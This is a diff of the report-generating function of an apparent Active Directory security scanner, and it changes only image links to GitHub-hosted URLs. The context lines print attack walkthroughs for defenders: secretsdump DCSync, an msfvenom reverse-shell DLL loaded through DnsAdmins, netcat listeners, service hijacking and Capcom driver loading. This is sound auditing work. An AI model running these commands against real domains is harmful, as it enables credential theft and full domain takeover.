@@ -103,7 +103,7 @@ function Generate-RBAChtml {
                                         <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --admin-count</p>
                                     </div>
                                     <span class="image-cell">
-                                        <img src="/Private/Report/Images/RBAC/adminsdholder-1.png" alt="Finding users with adminCount set to 1">
+                                        <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/adminsdholder-1.png" alt="Finding users with adminCount set to 1">
                                     </span>
                                 </div>
                             </td>
@@ -185,7 +185,7 @@ function Generate-RBAChtml {
                                                     <p class="code">nxc smb dc.test.local -u anonymous -p '' --shares</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/anonymous-1.png" alt="Finding open shares">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/anonymous-1.png" alt="Finding open shares">
                                                 </span>
                                             </div>
                                             <hr>
@@ -195,7 +195,7 @@ function Generate-RBAChtml {
                                                     <p class="code">nxc smb dc.test.local -u anonymous -p '' --rid-brute</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/anonymous-2.png" alt="RID brute">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/anonymous-2.png" alt="RID brute">
                                                 </span>
                                             </div>
                                         </td>
@@ -292,7 +292,7 @@ function Generate-RBAChtml {
                                                     <p>1. Each user in Active Directory has a lastlogon attribute which can be used to identify stale and unused accounts.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/inactive.png" alt="Inactive accounts">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/inactive.png" alt="Inactive accounts">
                                                 </span>
                                             </div>
                                         </td>
@@ -373,7 +373,7 @@ function Generate-RBAChtml {
                                                     <p class="code">impacket-secretsdump test.local/administrator:'Password123!'@dc.test.local -just-dc-ntlm</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
                                                 </span>
                                             </div>
                                         </td>
@@ -454,7 +454,7 @@ function Generate-RBAChtml {
                                                     <p class="code">impacket-secretsdump test.local/administrator:'Password123!'@dc.test.local -just-dc-ntlm</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
                                                 </span>
                                             </div>
                                         </td>
@@ -535,7 +535,7 @@ function Generate-RBAChtml {
                                                     <p class="code">impacket-secretsdump test.local/administrator:'Password123!'@dc.test.local -just-dc-ntlm</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/domain-enterprise-administrator.png" alt="Privileged accounts">
                                                 </span>
                                             </div>
                                         </td>
@@ -615,7 +615,7 @@ function Generate-RBAChtml {
                                                     <p>1. Upon compromise of an account, an attacker can check if the user is a member of the DnsAdmins group to see if they have the necessary privilege to perform this attack.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-1.png" alt="Checking for members of dnsadmins">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/dnsadmin-1.png" alt="Checking for members of dnsadmins">
                                                 </span>
                                             </div>
                                             <hr>
@@ -625,7 +625,7 @@ function Generate-RBAChtml {
                                                     <p class="code">msfvenom -a x64 -p windows/x64/shell_reverse_rcp LHOST=10.10.10.6 LPORT=80 -f dll > exploit.dll</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-2.png" alt="Generating a payload">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/dnsadmin-2.png" alt="Generating a payload">
                                                 </span>
                                             </div>
                                             <hr>
@@ -635,7 +635,7 @@ function Generate-RBAChtml {
                                                     <p class="code">dmscmd.exe dc01 /config /serverlevelplugindll c:\users\moe\documents\exploit.dll</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-3.png" alt="Inserting the dll">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/dnsadmin-3.png" alt="Inserting the dll">
                                                 </span>
                                             </div>
                                             <hr>
@@ -647,7 +647,7 @@ function Generate-RBAChtml {
                                                     <p class="code">nc -lvnp 80</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/dnsadmin-4.png" alt="Receiving a system shell on the domain controller">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/dnsadmin-4.png" alt="Receiving a system shell on the domain controller">
                                                 </span>
                                             </div>
                                         </td>
@@ -727,7 +727,7 @@ function Generate-RBAChtml {
                                                     <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Backup Operators group to see if they have the necessary privilege to perform this attack.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/backupoperator-1.png" alt="Checking for members of backup operators">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/backupoperator-1.png" alt="Checking for members of backup operators">
                                                 </span>
                                             </div>
                                             <hr>
@@ -738,7 +738,7 @@ function Generate-RBAChtml {
                                                     <p class="code">impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/backupoperator-2.png" alt="Extracting SAM and SYSTEM hive from domain controller">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/backupoperator-2.png" alt="Extracting SAM and SYSTEM hive from domain controller">
                                                 </span>
                                             </div>
                                             <hr>
@@ -748,7 +748,7 @@ function Generate-RBAChtml {
                                                     <p class="code">impacket-secretsdump test.local/'DC$'@dc.test.local -hashes :89aca08404383706e09c9861dfee797e</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/backupoperator-3.png" alt="Performing a DCSync">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/backupoperator-3.png" alt="Performing a DCSync">
                                                 </span>
                                             </div>
                                         </td>
@@ -828,7 +828,7 @@ function Generate-RBAChtml {
                                                     <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Server Operators group to see if they have the necessary privilege to perform this attack.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/serveroperator-1.png" alt="Checking for members of server operators">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/serveroperator-1.png" alt="Checking for members of server operators">
                                                 </span>
                                             </div>
                                             <hr>
@@ -841,7 +841,7 @@ function Generate-RBAChtml {
                                                     <p class="code">sc.exe start VMTools</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/serveroperator-2.png" alt="Replacing a service and restarting it">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/serveroperator-2.png" alt="Replacing a service and restarting it">
                                                 </span>
                                             </div>
                                             <hr>
@@ -851,7 +851,7 @@ function Generate-RBAChtml {
                                                     <p class="code">nc -lvnp 443</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/serveroperator-3.png" alt="Receiving a reverse shell on a domain controller">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/serveroperator-3.png" alt="Receiving a reverse shell on a domain controller">
                                                 </span>
                                             </div>
                                         </td>
@@ -931,7 +931,7 @@ function Generate-RBAChtml {
                                                     <p>1. Upon compromise of an account in the Account Operators group, the attacker can log in locally to a domain controller (tier 0 asset).</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/accountoperator-1.png" alt="Logging into domain controller">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/accountoperator-1.png" alt="Logging into domain controller">
                                                 </span>
                                             </div>
                                             <hr>
@@ -941,7 +941,7 @@ function Generate-RBAChtml {
                                                     <p class="code">whoami && hostname && net user accountoperator /domain</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/accountoperator-2.png" alt="Logging into domain controller">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/accountoperator-2.png" alt="Logging into domain controller">
                                                 </span>
                                             </div>
                                         </td>
@@ -1021,7 +1021,7 @@ function Generate-RBAChtml {
                                                     <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Print Operators group to see if they have the necessary privilege to perform this attack.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/printoperator-1.png" alt="Checking for members of print operators">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/printoperator-1.png" alt="Checking for members of print operators">
                                                 </span>
                                             </div>
                                             <hr>
@@ -1031,7 +1031,7 @@ function Generate-RBAChtml {
                                                     <p class="code">whoami /all</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/accountoperator-2.png" alt="Checking SeLoadDriverPrivilege">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/accountoperator-2.png" alt="Checking SeLoadDriverPrivilege">
                                                 </span>
                                             </div>
                                             <hr>
@@ -1041,7 +1041,7 @@ function Generate-RBAChtml {
                                                 <p class="code">.\ExploitCapcom.exe</p>
                                             </div>
                                             <span class="image-cell">
-                                                <img src="/Private/Report/Images/RBAC/printoperator-3.png" alt="Loading a malicious driver">
+                                                <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/printoperator-3.png" alt="Loading a malicious driver">
                                             </span>
                                         </div>
                                         </td>
@@ -1121,7 +1121,7 @@ function Generate-RBAChtml {
                                                     <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Remote Desktop Users group to see if they have the necessary privilege to perform this attack.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/remotedesktop-1.png" alt="Checking for members of remote desktop users">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/remotedesktop-1.png" alt="Checking for members of remote desktop users">
                                                 </span>
                                             </div>
                                             <hr>
@@ -1131,7 +1131,7 @@ function Generate-RBAChtml {
                                                     <p class="code">xfreerdp /u:rdpuser /p:'Password123!' /d:test.local /v:dc.test.local /cert-ignore /dynamic-resolution</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/remotedesktop-2.png" alt="Logging in via RDP">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/remotedesktop-2.png" alt="Logging in via RDP">
                                                 </span>
                                             </div>
                                         </td>
@@ -1211,7 +1211,7 @@ function Generate-RBAChtml {
                                                     <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Remote Management Users group to see if they have the necessary privilege to perform this attack.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/remotemanagement-1.png" alt="Checking for members of remote management users">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/remotemanagement-1.png" alt="Checking for members of remote management users">
                                                 </span>
                                             </div>
                                             <hr>
@@ -1221,7 +1221,7 @@ function Generate-RBAChtml {
                                                     <p class="code">evil-winrm -i dc.test.local -u remotemanagement -p Password123!</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/remotemanagement-2.png" alt="Logging in via WinRM">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/remotemanagement-2.png" alt="Logging in via WinRM">
                                                 </span>
                                             </div>
                                         </td>
@@ -1302,7 +1302,7 @@ function Generate-RBAChtml {
                                                     <p>1. Upon compromise of an account, an attacker can check if the user is a member of the Schema Admins group to see if they have the necessary privilege to perform this attack.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/schemaadmin-1.png" alt="Checking for members of schema admins">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/schemaadmin-1.png" alt="Checking for members of schema admins">
                                                 </span>
                                             </div>
                                             <hr>
@@ -1311,7 +1311,7 @@ function Generate-RBAChtml {
                                                     <p>2. Members of the group can modify the schema, which can be viewed in the ADSI editor.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/schemaadmin-2.png" alt="Viewing the schema">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/schemaadmin-2.png" alt="Viewing the schema">
                                                 </span>
                                             </div>
                                         </td>
@@ -1397,7 +1397,7 @@ function Generate-RBAChtml {
                                                     <p>1. All privileged accounts should be a member of the Protected Users group in ActiveDirectory.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/protecteduser-1.png" alt="Checking for members of protected users">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/protecteduser-1.png" alt="Checking for members of protected users">
                                                 </span>
                                             </div>
                                             <hr>
@@ -1406,7 +1406,7 @@ function Generate-RBAChtml {
                                                     <p>2. If a user is not a member of this group and logs into a computer, their credentials will remain in memory until the computer is restarted. This means they are available for theft from an attacker.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/protecteduser-2.png" alt="Logging in interactively">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/protecteduser-2.png" alt="Logging in interactively">
                                                 </span>
                                             </div>
                                             <hr>
@@ -1415,7 +1415,7 @@ function Generate-RBAChtml {
                                                     <p>3. Using tools like mimikatz, attackers with system access can extract credentials from memory and then impersonate the users that have logged into the system to move laterally and escalate privileges. If a domain admins credentials are stolen from a system they have logged into, the domain has been fully compromised.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/protecteduser-3.png" alt="Dumping cached credentials">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/protecteduser-3.png" alt="Dumping cached credentials">
                                                 </span>
                                             </div>
                                         </td>
@@ -1497,7 +1497,7 @@ function Generate-RBAChtml {
                                                     <p>1. All privileged accounts should have the account is sensitive and cannot be delegated flag set within Active Directory. This will mean that when impersonating privileged for example in constrained delegation, the attack will simply fail showing how important this is to implement.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/RBAC/sensitiveaccount-1.png" alt="Checking for sensitive accounts">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/RBAC/sensitiveaccount-1.png" alt="Checking for sensitive accounts">
                                                 </span>
                                             </div>
                                         </td>
